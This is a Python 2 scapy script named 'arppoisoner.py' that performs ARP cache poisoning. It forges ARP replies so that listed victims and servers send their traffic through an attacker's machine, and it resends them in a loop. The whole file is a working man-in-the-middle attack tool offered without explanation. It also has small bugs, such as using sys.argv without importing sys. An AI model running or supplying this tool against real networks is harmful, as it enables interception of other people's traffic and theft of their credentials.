from scapy.all import *
from os import uname #to check os
from sys import argv, exit
import time
import ipaddress
import threading

c = threading.Condition()
no_input = True

def osCheck():
    os = uname()[0].strip()
    if (os != 'Linux' and os != 'linux'):
        print('This tool is not suitable for non linux systems')
        print('... Exiting')
        exit(0)

def argCheck():
    if len(argv) != 5:
        print('incorrect number of arguments: ./arppoisoner.py victims.txt servers.txt MTM timeBetweenPackages')
        exit(0)

def findMacForIp(ip):
    os.system("ping -c 1 " + ip)
    pkt = sniff(count=1, filter="arp", timeout = 10)
    while len(pkt) == 0:
        os.system("ping -c 1 " + ip)
        pkt = sniff(count=1, filter="arp", timeout = 10)
    ipsniff = pkt[0].getlayer(ARP).pdst
    if (ipsniff == ip):
        return (pkt[0].getlayer(Ether).dst)
    else:
        return findMacForIp(ip)

def findMacsForIps(ips):
    macs = [""] * len(ips)
    count = 0;
    for ip in ips:
        macs[count] = findMacForIp(ip)
        count = count+1;
    return macs;

def createPackages(victimIPs, victimMACs, serverIPs, serverMACs, mtmIP, mtmMAC):
    pckts = list();
    for victimIndex in range(len(victimIPs)):
        for serverIndex in range(len(serverIPs)):
            print victimIPs[victimIndex]
            print serverIPs[serverIndex]
            newPkt1 = Ether(src=mtmMAC)/ARP(hwsrc = mtmMAC, psrc = serverIPs[serverIndex], hwdst = victimMACs[victimIndex], pdst = victimIPs[victimIndex])
            newPkt2 = Ether(src=mtmMAC)/ARP(hwsrc = mtmMAC, psrc = victimIPs[victimIndex], hwdst = serverMACs[serverIndex], pdst = serverIPs[serverIndex])
            pckts.extend(newPkt1)
            pckts.extend(newPkt2)
    return pckts

def sendPackagesOnce(pkts):
    for pkt in pkts:
        sendp(pkt)
    
def sendPackages(pkts, sleeptime):
    global no_input
    while(no_input):
        sendPackagesOnce(pkts)
        time.sleep(sleeptime)
        
def inputChecker():
    global no_input
    i = raw_input("hit enter to quit" + "\n")
    no_input = False
        
def main():
    osCheck()
    argCheck()
    with open(argv[1]) as victs:
        victimIPs = victs.read().splitlines()
    with open(argv[2]) as srvs:
        serverIPs = srvs.read().splitlines()
    mtmIP = argv[3]
    sleepTime = float(sys.argv[4])
    print "find mac for ips victims"
    victimMACs = findMacsForIps(victimIPs)
    print "find mac for ips server"
    serverMACs = findMacsForIps(serverIPs)
    print "find mac for mtm"
    mtmMAC = findMacForIp(mtmIP)
    print "create packages"
    pkts = createPackages(victimIPs, victimMACs, serverIPs, serverMACs, mtmIP, mtmMAC)
    print "send packages"
    if(sleepTime <= 0):
        sendPackagesOnce(pkts)
    else:
        threading.Thread(target=inputChecker).start()
        sendPackages(pkts, sleepTime)

if(__name__ == '__main__'):
    main()
